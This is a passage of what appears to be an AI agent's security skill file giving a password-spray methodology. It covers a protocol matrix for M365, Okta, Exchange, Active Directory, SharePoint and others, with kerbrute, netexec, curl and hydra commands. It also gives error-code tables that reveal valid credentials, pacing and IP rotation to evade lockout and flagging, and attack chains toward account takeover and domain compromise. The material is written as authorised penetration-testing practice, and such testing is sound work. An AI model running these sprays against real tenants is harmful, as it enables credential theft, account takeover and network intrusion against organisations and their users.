# password-spray-methodology — 全文续篇

> 主卡保留前 5 节；本文件从第 6 节起。原文件：`/root/.hermes/skills/security/password-spray-methodology/SKILL.md`

## Phase 4 — Spray Execution Matrix

| Protocol | Endpoint | Spray Command | Rate Limit | Skill Ref |
|----------|----------|---------------|------------|-----------|
| **M365 ROPC** | `login.microsoftonline.com/common/oauth2/token` | Python `attempt()` with state file | ≤1/user/lifetime | `m365-entra-attack` |
| **Okta** | `<tenant>.okta.com/api/v1/authn` | curl POST `{"username":"...","password":"..."}` | ≤2/user/lifetime | `okta-attack` |
| **Exchange OWA** | `/owa/auth.owa` (POST), `/ews/Exchange.asmx` (Basic) | curl HTTP POST or Basic Auth | Test 5 rapid first | `exchange-owa-attack` |
| **Kerberos (AD)** | KDC (TCP 88) | `kerbrute passwordspray --dc <DC> -d <DOMAIN> users.txt '<password>'` | No lockout from spray | — |
| **SMB / WinRM** | TCP 445 / 5985 | `netexec smb 10.0.0.0/24 -u users.txt -p passwords.txt --continue-on-success` | Per-service | — |
| **SharePoint SOAP** | `/_vti_bin/Authentication.asmx` | POST SOAP Login envelope | No rate limit on SP2013 farms | `hunt-sharepoint` |
| **WordPress XMLRPC** | `/xmlrpc.php` | `system.multicall` batches hundreds in 1 request | None observed | `hunt-auth-bypass` |
| **OIDC password grant** | `/oauth2/token` (custom tenant) | `grant_type=password` with `client_id` | Depends on IdP | — |
| **Citrix NetScaler** | `/vpn/index.html`, `/cgi/login` | POST form credentials | Per-instance | — |
| **F5 BIG-IP** | `/tmui/login.jsp` | POST form credentials | Per-instance | — |
| **Atlassian** | `/rest/auth/1/session` (Basic) | curl -u | No rate limit on many instances | — |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`, `/script` | curl POST | Per-instance | — |

### Kerbrute — Spray AD Without Lockout

```bash
# Enumerate first (zero lockout risk)
./kerbrute_linux_amd64 userenum \
  --dc 10.10.10.5 \
  --domain corp.local \
  usernames.txt

# Then spray — one password at a time across ALL valid users
./kerbrute_linux_amd64 passwordspray \
  --dc 10.10.10.5 \
  --domain corp.local \
  valid_users.txt 'Summer2026!'
```

### NetExec — Multi-Protocol Spray

```bash
# Spray SMB across subnet
netexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success

# Spray WinRM
netexec winrm 10.10.10.0/24 -u users.txt -p passwords.txt

# Spray MSSQL
netexec mssql 10.10.10.0/24 -u users.txt -p passwords.txt

# Single credential validation
netexec smb 10.10.10.5 -u administrator -p 'P@ssw0rd!'

# [+] = valid auth  |  (Pwn3d!) = local admin on that machine
```

### Burp Intruder — OWA Spray

```bash
# POST request to /owa/auth.owa
# Sniper mode: variable on username field
# Fixed password field = common candidate
# Track timestamp between launches to avoid re-spraying same password
```

---

## Phase 5 — Error Code Differentials

The difference between "wrong password" and "correct password but blocked" is everything. The latter is a confirmed finding even without a token.

### AADSTS Codes (M365/Entra — from `m365-entra-attack`)

| Code | Meaning | Password Valid? | Action |
|------|---------|----------------|--------|
| **AADSTS50034** | User does not exist | N/A | Remove from list |
| **AADSTS50126** | Invalid password | ❌ | User exists — retry within cap |
| **AADSTS50053** | Account locked (Smart Lockout) | Unknown | PRE-EXISTING → SOC finding |
| **AADSTS53003** | CA blocked token issuance | ✅ YES | **STOP — VALID CREDENTIAL** |
| **AADSTS50076** | MFA required | ✅ YES | **VALID** — second factor needed |
| **AADSTS50079** | Strong auth required | ✅ YES | **VALID** |
| **AADSTS50158** | External auth required | ✅ YES | **VALID** |
| **AADSTS530003** | Device-state required | ✅ YES | **VALID** |

**CRITICAL TRAP — ROPC substring false-positive:**
When CA requires MFA, the error body includes `"claims":{"access_token":{"capolids":...}}`. A loose substring check `if "access_token" in raw_body` will false-positive every MFA-blocked attempt. **Always parse JSON, then check `if "access_token" in parsed_dict`.**

### Okta Codes (from `okta-attack`)

| Response | Meaning | Password Valid? |
|----------|---------|----------------|
| `200 status=MFA_REQUIRED` | MFA challenge waiting | ✅ YES |
| `200 status=SUCCESS + sessionToken` | Full auth (no MFA) | ✅ YES |
| `200 status=PASSWORD_EXPIRED` | Must change password | ✅ YES |
| `200 status=LOCKED_OUT` | Account locked | Unknown |
| `401 E0000004` | Auth failed (user doesn't exist OR wrong password — Okta unifies) | ❌ |
| `401 E0000119` | User is locked | Unknown |
| `429` | Rate-limit hit | — |

### Exchange OWA Codes

| Status | Meaning |
|--------|---------|
| 302 + Location to `/owa/` | ✅ VALID — authenticated |
| 200 with same login page | ❌ Invalid |
| Consistent HTTP codes across 5 rapid attempts | No rate limit — spray viable |

---

## Engagement Discipline

### Must Do

- **State file with atomic writes**: per-user attempt counter (JSON)
- **Engagement journal**: JSONL log of every attempt (timestamp, email, password first 4 chars, status, AADSTS code)
- **IP rotation log**: per-day: date, src-ip, ISP-AS, operator-handle, round
- **Test ALL tenants**: sister domains often have separate Entra tenants with different password policies
- **Kill switch**: stop run if LOCKED count exceeds threshold (suggests pre-existing attacker or miscount)
- **Leaked creds FIRST**: each is 1 cap-attempt against the strongest guess for that user

### Anti-Patterns (Don't Do These)

- **DON'T** use leaked cred across multiple resources — burns cap with no marginal benefit when CA blocks
- **DON'T** retry after AADSTS50053 — account is locked
- **DON'T** spray >30 req/sec sustained to login.microsoftonline.com — IP flagged for credential-stuffing
- **DON'T** use Entra-style spray pace on Okta — anti-automation is tuner-different
- **DON'T** retract a CA-block finding — AADSTS53003/50076/50079 = password is correct
- **DON'T** skip user enumeration — spraying without known-valid usernames is blind noise
- **DON'T** use RockYou2024 — 98% garbage (hashes, truncated strings, unicode junk)
- **DON'T** spray a user more than HARD_CAP times across the entire engagement lifetime
- **DON'T** confuse `*.oktapreview.com` with production — preview is non-prod, different severity

### Active-Attacker Detection (Highest-Impact Byproduct)

The Smart Lockout math guarantee (1 < 10) doubles as an active-attacker detector:

1. Cap: 1 attempt per user
2. Observe AADSTS50053 (LOCKED) on multiple users
3. **You did not cause these locks** (1 < 10 = mathematically impossible)
4. **An external attacker is actively spraying the tenant RIGHT NOW**
5. Cluster locked users alphabetically → clustering = attacker using sorted username list
6. Diff lockout count between spray-start and spray-end → new locks = attacker active during your session
7. Document locked email list as SOC-actionable finding

---

## Chain Table

| Chain | From | To | Impact |
|-------|------|-----|--------|
| User enum → spray → valid cred | `hunt-ntlm-info` | This skill | ATO |
| Sprayed cred → email access | This skill | `m365-entra-attack` | Data exfil |
| Spray → MFA challenge → bypass | This skill | `hunt-mfa-bypass` | Full ATO |
| Spray → valid cred → lateral | This skill | NetExec/impacket | Domain compromise |
| Spray → lockout observation → SOC alert | This skill | `mid-engagement-ir-detection` | IR finding |
| Spray → SharePoint SOAP cred → FedAuth → authenticated surface | This skill | `hunt-sharepoint` | SharePoint access |
| LDAP enum → sAMAccountName list → AD spray | `hunt-ldap` | This skill (Kerbrute) | Mass-ATO |

---

## Tool Summary

| Tool | Purpose | Command |
|------|---------|---------|
| **Kerbrute** | AD user enum + spray (no lockout) | `kerbrute userenum/passwordspray` |
| **NetExec (nxc)** | Multi-protocol spray (SMB, WinRM, MSSQL, RDP) | `netexec smb 10.0.0.0/24 -u users.txt -p passwords.txt` |
| **Burp Intruder** | HTTP POST spray (OWA, custom portals) | Sniper mode, variable username, fixed password |
| **CeWL** | Target-specific wordlist generation | `cewl -d 3 -m 6 --lowercase https://target.com -w words.txt` |
| **username-anarchy** | Username format generation from real names | `./username-anarchy -i names.txt > usernames.txt` |
| **Hashcat** | Password rule generation (PACK) + wordlist mutation | `hashcat --stdout -r rules/best64.rule words.txt` |
| **curl** | Manual spray probes, lockout tests | `curl --max-time 30 --connect-timeout 10 -sk -u "user:pass" https://TARGET/endpoint` |
| **Python** | Custom spray script with state file + JSON parsing | See `m365-entra-attack` for ROPC template |
| **MailSniper** | Post-compromise GAL extraction from OWA | Amplifies spray list after first valid cred |
| **hydra** | HTTP form spray (legacy — prefer Burp Intruder) | `hydra -L users.txt -P passwords.txt http-post-form` |

---

## Verification

1. **Spray tool availability** — confirm spray tools:
   ```bash
   which crackmapexec 2>/dev/null && echo "PASS: crackmapexec installed" || echo "NOTE: crackmapexec not installed"
   pip3 show o365spray 2>/dev/null | grep -q "Name:" && echo "PASS: o365spray installed" || echo "NOTE: o365spray not installed"
   ```
All tests verify password spray readiness.

---

## Pitfalls
- **Spraying without lockout policy knowledge** — Entra ID Smart Lockout, Okta lockout, and on-prem AD lockout all work differently. Know the threshold before spraying.
- **One-password spray** — spraying only "Password123" is nearly useless. Use a targeted list of 2-4 high-probability passwords per org.
- **Spray without user enumeration first** — validating usernames before spraying reduces noise and lockout risk. Always enum first.
- **Timing-based account validation** — password spray timing differentials can confirm valid accounts. Measure carefully with n>=10 samples.
- **OAuth/Modern Auth spray** — modern auth endpoints (OAuth2 token endpoint) have different lockout behavior than legacy endpoints. Test both paths.


---

## Related Skills

- **`m365-entra-attack`** — M365-specific ROPC validation, AADSTS code reference, OneDrive user enumeration, Smart Lockout math, tenant discovery
- **`okta-attack`** — Okta-specific spray endpoint, error codes, factor enumeration, lockout discipline
- **`exchange-owa-attack`** — OWA rate-limit testing, Basic Auth spray, NTLM Type-2 domain extraction, government naming patterns
- **`hunt-brute-force`** — Four rate-limit states, shadow-throttle detection, IP rotation bypass, OTP brute methodology
- **`hunt-auth-bypass`** — Legacy Protocol Matrix (WordPress XMLRPC, Citrix, F5, Atlassian spray endpoints)
- **`hunt-sharepoint`** — SharePoint SOAP Authentication.asmx anonymous credential brute-force (no rate limit)
- **`hunt-ldap`** — sAMAccountName enumeration → spray target list
- **`hunt-ntlm-info`** — NTLM Type-2 → UPN format → credential format for spray
- **`hunt-mfa-bypass`** — Spray → MFA challenge → bypass chain
- **`mid-engagement-ir-detection`** — Active-attacker detection via Smart Lockout lockout differential
- **`hunt-wordpress`** — REST API user enumeration → spray target list

